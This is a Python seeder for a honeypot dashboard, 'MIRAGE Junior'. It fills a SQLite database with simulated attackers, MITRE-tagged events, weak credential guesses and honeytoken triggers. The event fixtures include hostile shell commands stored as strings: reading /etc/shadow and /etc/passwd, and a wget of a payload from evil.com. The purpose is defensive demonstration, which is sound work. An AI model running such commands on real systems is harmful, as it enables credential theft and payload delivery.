"""
MIRAGE Junior — Demo Data Seeder
Seeds the database with realistic simulated attack data for demonstrations.
Run via: python main.py --demo
"""

import sqlite3
import os
import random
from datetime import datetime, timedelta


def seed_data():
    """Seed the database with realistic demo attack data."""
    db_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                           'database', 'mirage_junior.db')

    # Ensure database directory exists
    os.makedirs(os.path.dirname(db_path), exist_ok=True)

    # Run db_setup first to ensure tables exist
    from database.db_setup import init_db
    init_db()

    conn = sqlite3.connect(db_path)
    c = conn.cursor()

    # Clear existing demo data
    c.execute("DELETE FROM events")
    c.execute("DELETE FROM attackers")
    c.execute("DELETE FROM credentials")
    c.execute("DELETE FROM quarantine_log")
    c.execute("DELETE FROM honeytoken_triggers")

    # ─── ATTACKER PROFILES ──────────────────────────────────────────────
    attackers = [
        # (ip, country, city, isp, lat, lon, threat_score, classification, quarantined)
        ('45.33.32.156', 'Russia', 'Moscow', 'Rostelecom', 55.7558, 37.6173, 94, 'CRITICAL', 1),
        ('103.22.4.88', 'China', 'Beijing', 'China Telecom', 39.9042, 116.4074, 67, 'ACTIVE_THREAT', 0),
        ('185.220.101.34', 'Germany', 'Frankfurt', 'Tor Exit Node', 50.1109, 8.6821, 82, 'CRITICAL', 1),
        ('91.240.118.172', 'Netherlands', 'Amsterdam', 'DigitalOcean', 52.3676, 4.9041, 45, 'SUSPICIOUS', 0),
        ('5.188.210.101', 'Russia', 'St Petersburg', 'Selectel', 59.9343, 30.3351, 78, 'CRITICAL', 1),
        ('192.241.236.31', 'USA', 'New York', 'Linode', 40.7128, -74.0060, 38, 'SUSPICIOUS', 0),
        ('58.218.198.101', 'China', 'Nanjing', 'Chinanet', 32.0603, 118.7969, 52, 'ACTIVE_THREAT', 0),
        ('200.174.198.42', 'Brazil', 'Sao Paulo', 'Vivo', -23.5505, -46.6333, 29, 'SUSPICIOUS', 0),
        ('106.51.82.173', 'India', 'Bangalore', 'ACT Fibernet', 12.9716, 77.5946, 18, 'SCANNER', 0),
        ('41.231.53.9', 'Tunisia', 'Tunis', 'Tunisie Telecom', 36.8065, 10.1815, 12, 'SCANNER', 0),
        ('178.128.87.15', 'Singapore', 'Singapore', 'DigitalOcean', 1.3521, 103.8198, 55, 'ACTIVE_THREAT', 0),
        ('159.65.140.86', 'India', 'Mumbai', 'DigitalOcean', 19.0760, 72.8777, 33, 'SUSPICIOUS', 0),
        ('139.59.32.112', 'India', 'Delhi', 'DigitalOcean', 28.7041, 77.1025, 8, 'SCANNER', 0),
        ('46.101.245.17', 'UK', 'London', 'DigitalOcean', 51.5074, -0.1278, 71, 'ACTIVE_THREAT', 0),
        ('167.99.17.231', 'USA', 'San Francisco', 'DigitalOcean', 37.7749, -122.4194, 15, 'SCANNER', 0),
        ('104.248.18.55', 'Netherlands', 'Amsterdam', 'DigitalOcean', 52.3676, 4.9041, 42, 'SUSPICIOUS', 0),
        ('142.93.108.44', 'Germany', 'Frankfurt', 'DigitalOcean', 50.1109, 8.6821, 60, 'ACTIVE_THREAT', 0),
        ('68.183.55.22', 'USA', 'Dallas', 'DigitalOcean', 32.7767, -96.7970, 25, 'SUSPICIOUS', 0),
        ('188.166.63.88', 'UK', 'London', 'DigitalOcean', 51.5074, -0.1278, 9, 'SCANNER', 0),
        ('209.97.177.91', 'USA', 'Atlanta', 'DigitalOcean', 33.7490, -84.3880, 88, 'CRITICAL', 1),
    ]

    now = datetime.now()

    for atk in attackers:
        first_seen = now - timedelta(hours=random.randint(1, 72))
        last_seen = first_seen + timedelta(minutes=random.randint(1, 120))
        total_events = random.randint(3, 25)
        c.execute("""INSERT INTO attackers 
                     (ip_address, first_seen, last_seen, total_events, threat_score, classification,
                      country, city, isp, latitude, longitude, is_quarantined)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                  (atk[0], first_seen.isoformat(), last_seen.isoformat(), total_events,
                   atk[6], atk[7], atk[1], atk[2], atk[3], atk[4], atk[5], atk[8]))

    # ─── EVENTS — Full attack scenarios ─────────────────────────────────

    event_scenarios = [
        # Attacker 1: Full kill chain (CRITICAL - 94)
        ('45.33.32.156', [
            (0, 8080, 'HTTP', 'scan', '{"path": "/robots.txt"}', 5, 'T1046'),
            (2, 8080, 'HTTP', 'scan', '{"path": "/wp-login.php"}', 5, 'T1046'),
            (5, 8080, 'HTTP', 'login_attempt', '{"path": "/admin", "method": "POST"}', 8, 'T1110'),
            (9, 8080, 'HTTP', 'targeted_recon', '{"path": "/.env"}', 20, 'T1552.001'),
            (101, 2222, 'SSH', 'connection', '{"banner": "SSH-2.0-OpenSSH_7.6p1"}', 5, 'T1046'),
            (104, 2222, 'SSH', 'login_attempt', '{"username": "root", "password": "admin123"}', 8, 'T1110'),
            (106, 2222, 'SSH', 'login_attempt', '{"username": "root", "password": "toor"}', 8, 'T1078.001'),
            (108, 2222, 'SSH', 'shell_command', '{"command": "whoami", "output": "root"}', 20, 'T1033'),
            (109, 2222, 'SSH', 'shell_command', '{"command": "cat /etc/passwd"}', 5, 'T1087.001'),
            (110, 2222, 'SSH', 'shell_command', '{"command": "uname -a"}', 5, 'T1082'),
            (112, 2121, 'FTP', 'connection', '{"type": "anonymous"}', 5, 'T1046'),
        ]),
        # Attacker 2: HTTP scanner + SSH (ACTIVE_THREAT - 67)
        ('103.22.4.88', [
            (0, 8080, 'HTTP', 'scan', '{"path": "/"}', 5, 'T1046'),
            (1, 8080, 'HTTP', 'scan', '{"path": "/robots.txt"}', 5, 'T1046'),
            (3, 8080, 'HTTP', 'scan', '{"path": "/phpmyadmin/"}', 5, 'T1046'),
            (5, 8080, 'HTTP', 'login_attempt', '{"path": "/wp-login.php"}', 8, 'T1110'),
            (7, 8080, 'HTTP', 'login_attempt', '{"path": "/admin"}', 8, 'T1110'),
            (15, 2222, 'SSH', 'connection', '{}', 5, 'T1046'),
            (18, 2222, 'SSH', 'login_attempt', '{"username": "admin", "password": "admin"}', 8, 'T1078.001'),
            (20, 2222, 'SSH', 'login_attempt', '{"username": "root", "password": "password"}', 8, 'T1078.001'),
            (22, 2222, 'SSH', 'shell_command', '{"command": "whoami"}', 15, 'T1033'),
        ]),
        # Attacker 3: Tor exit node, focused SSH brute (CRITICAL - 82)
        ('185.220.101.34', [
            (0, 2222, 'SSH', 'login_attempt', '{"username": "root", "password": "root"}', 8, 'T1078.001'),
            (2, 2222, 'SSH', 'login_attempt', '{"username": "root", "password": "admin"}', 8, 'T1078.001'),
            (4, 2222, 'SSH', 'login_attempt', '{"username": "root", "password": "123456"}', 8, 'T1110'),
            (6, 2222, 'SSH', 'login_attempt', '{"username": "admin", "password": "admin"}', 8, 'T1110'),
            (8, 2222, 'SSH', 'shell_command', '{"command": "whoami"}', 15, 'T1033'),
            (9, 2222, 'SSH', 'shell_command', '{"command": "cat /etc/shadow"}', 5, 'T1087.001'),
            (10, 2222, 'SSH', 'shell_command', '{"command": "wget http://evil.com/payload.sh"}', 5, 'T1105'),
            (12, 8080, 'HTTP', 'targeted_recon', '{"path": "/api/config"}', 20, 'T1552.001'),
            (14, 8080, 'HTTP', 'scan', '{"path": "/.env"}', 5, 'T1552.001'),
        ]),
        # Attacker 4: Casual scanner (SUSPICIOUS - 45)
        ('91.240.118.172', [
            (0, 8080, 'HTTP', 'scan', '{"path": "/"}', 5, 'T1046'),
            (1, 8080, 'HTTP', 'scan', '{"path": "/admin"}', 5, 'T1046'),
            (3, 8080, 'HTTP', 'login_attempt', '{"path": "/admin"}', 8, 'T1110'),
            (5, 8080, 'HTTP', 'scan', '{"path": "/api/config"}', 20, 'T1552.001'),
            (8, 2222, 'SSH', 'connection', '{}', 5, 'T1046'),
        ]),
        # Attacker 5: Aggressive bot (CRITICAL - 78)
        ('5.188.210.101', [
            (0, 2222, 'SSH', 'login_attempt', '{"username": "root", "password": "root"}', 8, 'T1078.001'),
            (1, 2222, 'SSH', 'login_attempt', '{"username": "root", "password": "toor"}', 8, 'T1078.001'),
            (2, 2222, 'SSH', 'login_attempt', '{"username": "ubuntu", "password": "ubuntu"}', 8, 'T1110'),
            (3, 2222, 'SSH', 'login_attempt', '{"username": "admin", "password": "password123"}', 8, 'T1110'),
            (5, 2222, 'SSH', 'shell_command', '{"command": "id"}', 15, 'T1033'),
            (6, 2222, 'SSH', 'shell_command', '{"command": "ls /tmp"}', 5, 'T1083'),
            (8, 8080, 'HTTP', 'scan', '{"path": "/.env"}', 20, 'T1552.001'),
            (10, 2121, 'FTP', 'login_attempt', '{"username": "admin", "password": "admin"}', 8, 'T1110'),
        ]),
        # Attacker 6: US scanner (SUSPICIOUS - 38)
        ('192.241.236.31', [
            (0, 8080, 'HTTP', 'scan', '{"path": "/"}', 5, 'T1046'),
            (2, 8080, 'HTTP', 'scan', '{"path": "/wp-login.php"}', 5, 'T1046'),
            (4, 8080, 'HTTP', 'login_attempt', '{"path": "/wp-login.php"}', 8, 'T1110'),
            (6, 8080, 'HTTP', 'targeted_recon', '{"path": "/api/config"}', 20, 'T1552.001'),
        ]),
        # Attacker 7: Chinese bot (ACTIVE_THREAT - 52)
        ('58.218.198.101', [
            (0, 2222, 'SSH', 'login_attempt', '{"username": "root", "password": "1q2w3e4r"}', 8, 'T1110'),
            (1, 2222, 'SSH', 'login_attempt', '{"username": "root", "password": "qwerty"}', 8, 'T1110'),
            (3, 2222, 'SSH', 'shell_command', '{"command": "whoami"}', 15, 'T1033'),
            (4, 2222, 'SSH', 'shell_command', '{"command": "uname -a"}', 5, 'T1082'),
            (6, 8080, 'HTTP', 'scan', '{"path": "/phpmyadmin/"}', 5, 'T1046'),
            (8, 8080, 'HTTP', 'login_attempt', '{"path": "/admin"}', 8, 'T1110'),
        ]),
        # Attacker 8: Brazil (SUSPICIOUS - 29)
        ('200.174.198.42', [
            (0, 8080, 'HTTP', 'scan', '{"path": "/robots.txt"}', 5, 'T1046'),
            (2, 8080, 'HTTP', 'scan', '{"path": "/admin"}', 5, 'T1046'),
            (4, 8080, 'HTTP', 'login_attempt', '{"path": "/admin"}', 8, 'T1110'),
            (7, 2121, 'FTP', 'connection', '{"type": "anonymous"}', 5, 'T1046'),
            (9, 2121, 'FTP', 'file_access', '{"file": "backup_database.sql"}', 5, 'T1005'),
        ]),
        # Attacker 9: India scanner (SCANNER - 18)
        ('106.51.82.173', [
            (0, 8080, 'HTTP', 'scan', '{"path": "/"}', 5, 'T1046'),
            (1, 8080, 'HTTP', 'scan', '{"path": "/robots.txt"}', 5, 'T1046'),
            (3, 2222, 'SSH', 'connection', '{}', 5, 'T1046'),
        ]),
        # Attacker 10: Tunisia (SCANNER - 12)
        ('41.231.53.9', [
            (0, 8080, 'HTTP', 'scan', '{"path": "/"}', 5, 'T1046'),
            (2, 8080, 'HTTP', 'scan', '{"path": "/phpmyadmin/"}', 5, 'T1046'),
        ]),
        # Attacker 11: Singapore (ACTIVE_THREAT - 55)
        ('178.128.87.15', [
            (0, 2222, 'SSH', 'login_attempt', '{"username": "root", "password": "Pa$$w0rd"}', 8, 'T1110'),
            (2, 2222, 'SSH', 'login_attempt', '{"username": "root", "password": "root123"}', 8, 'T1078.001'),
            (4, 2222, 'SSH', 'shell_command', '{"command": "whoami"}', 15, 'T1033'),
            (5, 2222, 'SSH', 'shell_command', '{"command": "ls -la /"}', 5, 'T1083'),
            (7, 8080, 'HTTP', 'scan', '{"path": "/admin"}', 5, 'T1046'),
            (9, 8080, 'HTTP', 'login_attempt', '{"path": "/admin"}', 8, 'T1110'),
            (11, 2121, 'FTP', 'connection', '{"type": "anonymous"}', 5, 'T1046'),
        ]),
        # Attacker 12-20: Simpler scenarios for bulk
        ('159.65.140.86', [
            (0, 8080, 'HTTP', 'scan', '{"path": "/"}', 5, 'T1046'),
            (1, 8080, 'HTTP', 'login_attempt', '{"path": "/wp-login.php"}', 8, 'T1110'),
            (3, 2222, 'SSH', 'login_attempt', '{"username": "root", "password": "test"}', 8, 'T1110'),
            (5, 8080, 'HTTP', 'scan', '{"path": "/.env"}', 12, 'T1552.001'),
        ]),
        ('209.97.177.91', [
            (0, 8080, 'HTTP', 'scan', '{"path": "/robots.txt"}', 5, 'T1046'),
            (2, 8080, 'HTTP', 'targeted_recon', '{"path": "/.env"}', 20, 'T1552.001'),
            (5, 2222, 'SSH', 'login_attempt', '{"username": "root", "password": "letmein"}', 8, 'T1110'),
            (7, 2222, 'SSH', 'shell_command', '{"command": "whoami"}', 15, 'T1033'),
            (8, 2222, 'SSH', 'shell_command', '{"command": "cat /etc/passwd"}', 5, 'T1087.001'),
            (10, 2121, 'FTP', 'connection', '{"type": "anonymous"}', 5, 'T1046'),
            (12, 2121, 'FTP', 'file_access', '{"file": "credentials.xlsx"}', 25, 'T1005'),
            (14, 8080, 'HTTP', 'scan', '{"path": "/api/config"}', 5, 'T1552.001'),
        ]),
    ]

    for ip, events in event_scenarios:
        base_time = now - timedelta(hours=random.randint(1, 48))
        for offset_sec, port, protocol, event_type, details, pts, mitre in events:
            ts = base_time + timedelta(seconds=offset_sec)
            c.execute("""INSERT INTO events 
                         (timestamp, ip_address, port, protocol, event_type, details, threat_pts, mitre_id)
                         VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                      (ts.isoformat(), ip, port, protocol, event_type, details, pts, mitre))

    # ─── CREDENTIALS ─────────────────────────────────────────────────────

    cred_data = [
        ('45.33.32.156', 'HTTP', 'admin', 'password123'),
        ('45.33.32.156', 'SSH', 'root', 'admin123'),
        ('45.33.32.156', 'SSH', 'root', 'toor'),
        ('103.22.4.88', 'HTTP', 'admin', 'admin'),
        ('103.22.4.88', 'SSH', 'admin', 'admin'),
        ('103.22.4.88', 'SSH', 'root', 'password'),
        ('185.220.101.34', 'SSH', 'root', 'root'),
        ('185.220.101.34', 'SSH', 'root', 'admin'),
        ('185.220.101.34', 'SSH', 'root', '123456'),
        ('185.220.101.34', 'SSH', 'admin', 'admin'),
        ('91.240.118.172', 'HTTP', 'admin', 'letmein'),
        ('5.188.210.101', 'SSH', 'root', 'root'),
        ('5.188.210.101', 'SSH', 'root', 'toor'),
        ('5.188.210.101', 'SSH', 'ubuntu', 'ubuntu'),
        ('5.188.210.101', 'SSH', 'admin', 'password123'),
        ('5.188.210.101', 'FTP', 'admin', 'admin'),
        ('192.241.236.31', 'HTTP', 'admin', 'test123'),
        ('58.218.198.101', 'SSH', 'root', '1q2w3e4r'),
        ('58.218.198.101', 'SSH', 'root', 'qwerty'),
        ('200.174.198.42', 'HTTP', 'admin', 'welcome1'),
        ('178.128.87.15', 'SSH', 'root', 'Pa$$w0rd'),
        ('178.128.87.15', 'SSH', 'root', 'root123'),
        ('178.128.87.15', 'HTTP', 'admin', '123456'),
        ('159.65.140.86', 'HTTP', 'admin', 'admin123'),
        ('159.65.140.86', 'SSH', 'root', 'test'),
        ('209.97.177.91', 'SSH', 'root', 'letmein'),
        ('46.101.245.17', 'SSH', 'root', 'password1'),
        ('46.101.245.17', 'HTTP', 'admin', 'qwerty'),
        ('167.99.17.231', 'HTTP', 'admin', 'admin'),
        ('104.248.18.55', 'SSH', 'root', '12345678'),
        ('142.93.108.44', 'SSH', 'root', 'passw0rd'),
        ('68.183.55.22', 'HTTP', 'admin', 'welcome'),
        ('188.166.63.88', 'HTTP', 'admin', 'test'),
    ]

    for ip, proto, user, pwd in cred_data:
        ts = now - timedelta(hours=random.randint(1, 48), minutes=random.randint(0, 59))
        c.execute("""INSERT INTO credentials (timestamp, ip_address, protocol, username, password, success)
                     VALUES (?, ?, ?, ?, ?, 0)""", (ts.isoformat(), ip, proto, user, pwd))

    # ─── QUARANTINE LOG ───────────────────────────────────────────────────

    quarantined_ips = [
        ('45.33.32.156', 94, 'Threat score exceeded critical threshold (94/100)'),
        ('185.220.101.34', 82, 'Threat score exceeded critical threshold (82/100)'),
        ('5.188.210.101', 78, 'Threat score exceeded critical threshold (78/100)'),
        ('209.97.177.91', 88, 'Threat score exceeded critical threshold (88/100)'),
    ]

    for ip, score, reason in quarantined_ips:
        blocked_at = now - timedelta(minutes=random.randint(5, 180))
        expires_at = blocked_at + timedelta(hours=1)
        is_active = 1 if expires_at > now else 0
        c.execute("""INSERT INTO quarantine_log 
                     (ip_address, blocked_at, expires_at, reason, threat_score, is_active)
                     VALUES (?, ?, ?, ?, ?, ?)""",
                  (ip, blocked_at.isoformat(), expires_at.isoformat(), reason, score, is_active))

    # ─── HONEYTOKEN TRIGGERS ──────────────────────────────────────────────

    honeytoken_data = [
        ('45.33.32.156', '.env', 'http_endpoint', 'Accessed /.env endpoint'),
        ('185.220.101.34', '.env', 'http_endpoint', 'Accessed /.env endpoint'),
        ('5.188.210.101', '.env', 'http_endpoint', 'Accessed /.env endpoint'),
        ('209.97.177.91', '.env', 'http_endpoint', 'Accessed /.env endpoint'),
        ('209.97.177.91', 'credentials.xlsx', 'ftp_file', 'Downloaded credentials.xlsx via FTP'),
        ('200.174.198.42', 'backup_database.sql', 'ftp_file', 'Attempted download of backup_database.sql'),
    ]

    for ip, name, ttype, details in honeytoken_data:
        ts = now - timedelta(hours=random.randint(1, 24))
        c.execute("""INSERT INTO honeytoken_triggers 
                     (timestamp, token_name, token_type, ip_address, details)
                     VALUES (?, ?, ?, ?, ?)""",
                  (ts.isoformat(), name, ttype, ip, details))

    conn.commit()
    conn.close()
    print(f"  ✅ Seeded: {len(attackers)} attackers, {sum(len(e[1]) for e in event_scenarios)} events, "
          f"{len(cred_data)} credentials, {len(quarantined_ips)} quarantines, {len(honeytoken_data)} honeytoken triggers")


if __name__ == '__main__':
    seed_data()
